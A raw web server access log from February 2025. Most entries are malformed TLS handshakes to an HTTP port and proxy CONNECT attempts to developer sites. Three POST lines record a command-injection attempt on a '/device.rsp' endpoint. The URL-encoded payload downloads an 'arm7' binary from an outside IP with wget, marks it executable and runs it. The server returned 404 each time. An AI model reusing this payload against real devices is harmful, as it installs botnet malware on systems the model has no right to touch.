127.0.0.1 - - [19/Feb/2025:00:35:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:35:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:35:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:35:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:35:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:35:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:35:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:35:56 +0300] "\x16\x03\x01\x07" 400 226
91.224.92.10 - - [19/Feb/2025:00:39:06 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
91.224.92.10 - - [19/Feb/2025:00:43:11 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:00:44:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:44:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:00:45:56 +0300] "\x16\x03\x01\x07" 400 226
91.224.92.10 - - [19/Feb/2025:00:46:00 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
5.101.0.66 - - [19/Feb/2025:00:47:45 +0300] "\x16\x03\x02\x01o\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:11:12 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:11:12 +0300] "\x16\x03\x01\x07" 400 226
193.68.89.10 - - [19/Feb/2025:08:12:59 +0300] "GET / HTTP/1.1" 200 68482
127.0.0.1 - - [19/Feb/2025:08:14:11 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:14:11 +0300] "\x16\x03\x01\x07" 400 226
92.246.87.21 - - [19/Feb/2025:08:18:11 +0300] "GET / HTTP/1.1" 200 68484
127.0.0.1 - - [19/Feb/2025:08:21:13 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:21:13 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:21:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:21:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:21:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:21:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:21:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:21:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:21:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:21:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:08:21:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:08:21:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:21:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:21:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:08:21:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:21:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:21:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:21:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:24:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:24:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
46.19.143.10 - - [19/Feb/2025:08:30:04 +0300] "GET / HTTP/1.1" 200 66517
127.0.0.1 - - [19/Feb/2025:08:31:13 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:08:31:13 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:08:32:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:32:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:32:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:32:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:32:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:32:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:32:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:32:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:32:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:32:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:08:32:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:32:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:32:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:08:32:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:32:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:32:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:34:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:08:34:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:41:13 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:41:13 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:42:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:42:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:42:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:08:42:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:42:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:42:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:42:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:08:42:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:42:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:42:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:42:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:42:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:08:42:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:42:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:42:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:42:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:44:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:44:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
193.68.89.51 - - [19/Feb/2025:08:46:22 +0300] "GET / HTTP/1.1" 200 66284
127.0.0.1 - - [19/Feb/2025:08:51:13 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:51:13 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:52:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:52:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:52:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:52:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:52:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:52:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:52:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:08:52:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:52:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:52:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:08:52:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:08:52:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:52:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:52:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:08:52:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:52:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:08:54:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:08:54:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
80.82.77.202 - - [19/Feb/2025:08:57:51 +0300] "\x16\x03\x02\x01o\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:01:13 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:01:13 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:02:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:02:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:02:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:02:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:02:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:02:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:02:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:02:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:02:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:02:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:02:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:02:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:02:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:02:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:02:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:02:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:04:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:04:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:11:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:11:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:12:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:12:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:12:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:12:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:12:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:12:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:12:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:12:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:12:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:12:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:12:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:12:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:12:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:12:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:12:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:12:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:13:40 +0300] "CONNECT www.jetbrains.com:443 HTTP/1.1" 200 67201
127.0.0.1 - - [19/Feb/2025:09:13:40 +0300] "CONNECT www.jetbrains.com:443 HTTP/1.1" 200 67201
127.0.0.1 - - [19/Feb/2025:09:13:40 +0300] "\x16\x03\x03\x01\x88\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:13:40 +0300] "\x16\x03\x03\x01\x88\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:13:40 +0300] "CONNECT www.jetbrains.com:443 HTTP/1.1" 200 67201
127.0.0.1 - - [19/Feb/2025:09:13:40 +0300] "CONNECT www.jetbrains.com:443 HTTP/1.1" 200 67201
127.0.0.1 - - [19/Feb/2025:09:13:40 +0300] "\x16\x03\x03\x01\x88\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:13:40 +0300] "\x16\x03\x03\x01\x88\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:13:43 +0300] "CONNECT www.jetbrains.com:443 HTTP/1.1" 200 67201
127.0.0.1 - - [19/Feb/2025:09:13:43 +0300] "\x16\x03\x03\x01\x88\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:13:45 +0300] "CONNECT schemastore.org:443 HTTP/1.1" 200 67185
127.0.0.1 - - [19/Feb/2025:09:13:45 +0300] "\x16\x03\x03\x01\x86\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:13:45 +0300] "CONNECT schemastore.org:443 HTTP/1.1" 200 67185
127.0.0.1 - - [19/Feb/2025:09:13:45 +0300] "\x16\x03\x03\x01\x86\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:13:45 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [19/Feb/2025:09:13:45 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:13:45 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [19/Feb/2025:09:13:45 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:13:45 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [19/Feb/2025:09:13:45 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:13:45 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [19/Feb/2025:09:13:45 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:13:47 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [19/Feb/2025:09:13:47 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:13:47 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [19/Feb/2025:09:13:47 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:14:34 +0300] "CONNECT www.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:34 +0300] "CONNECT www.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:34 +0300] "CONNECT www.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:34 +0300] "CONNECT www.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:35 +0300] "CONNECT www.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:37 +0300] "CONNECT schemastore.org:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:43 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:43 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:43 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:43 +0300] "CONNECT packagist.org:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:49 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:49 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:49 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:49 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:49 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:49 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:49 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:49 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:49 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:49 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:53 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:53 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:53 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:53 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:53 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:53 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:53 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:53 +0300] "CONNECT packagist.org:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:54 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:54 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:54 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:54 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:54 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:54 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:14:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:14:54 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:54 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:55 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:14:55 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:15:59 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:15:59 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:15:59 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:15:59 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:16:02 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:16:02 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:16:04 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:16:04 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:18:44 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:19:33 +0300] "CONNECT www.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:19:33 +0300] "CONNECT www.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:19:33 +0300] "CONNECT www.jetbrains.com:443 HTTP/1.1" 405 224
